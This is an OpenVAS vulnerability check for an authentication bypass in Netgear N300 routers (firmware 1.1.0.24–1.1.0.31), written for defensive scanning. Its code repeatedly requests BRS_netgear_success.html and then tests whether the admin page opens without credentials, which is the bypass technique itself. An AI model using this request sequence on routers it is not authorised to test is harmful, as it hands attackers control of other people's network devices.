###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_netgear_n300_auth_bypass_vuln.nasl 11493 2018-09-20 09:02:35Z asteins $
#
# Netgear N300 Wireless Router Authentication Bypass Vulnerability
#
# Authors:
# Kashinath T <tkashinath@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.806850");
  script_version("$Revision: 11493 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-09-20 11:02:35 +0200 (Thu, 20 Sep 2018) $");
  script_tag(name:"creation_date", value:"2016-02-04 15:00:14 +0530 (Thu, 04 Feb 2016)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("Netgear N300 Wireless Router Authentication Bypass Vulnerability");

  script_tag(name:"summary", value:"This host is running Netgear N300
  wireless router and is prone to authentication bypass vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET method
  and check whether it is able to access admin panel of the router.");

  script_tag(name:"insight", value:"The flaw is due to the file
  BRS_netgear_success.html allows the user to access the router without
  credentials while checking access to Internet.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attacker to gain access to the administration interface of the router
  and manipulate the device's settings.");

  script_tag(name:"affected", value:"NetGear N300 wireless router firmware
  version 1.1.0.24 - 1.1.0.31");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39356");
  script_xref(name:"URL", value:"http://www.shellshocklabs.com/2015/09/part-1en-hacking-netgear-jwnr2010v5.html");

  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 8080, 8181);
  script_mandatory_keys("NETGEAR/banner");

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

netport = get_http_port(default:8080);

banner = get_http_banner(port:netport);

if('Basic realm="NETGEAR' >!< banner){
  exit(0);
}

buf = http_get_cache( item:'/', port:netport );

if('HTTP/1.1 401 Unauthorized' >!< buf){
  exit(0);
}

## Calling /BRS_netgear_success.html multiple times
for( i=0; i<=5; i++)
{
  req1 = http_get( item:'/BRS_netgear_success.html', port:netport );
  buf1 = http_keepalive_send_recv( port:netport, data:req1, bodyonly:FALSE);

  if(buf1)
  {
    req2 = http_get( item:'/', port:netport );
    buf2 = http_keepalive_send_recv( port:netport, data:req2, bodyonly:FALSE);

    if( "NETGEAR" >< buf2 && "firstpage_var" >< buf2 && "enable_action" >< buf2)
    {
      report = report_vuln_url( port:netport, url:"/");
      security_message(port:netport, data:report);
      exit(0);
    }
  }
}

exit(99);
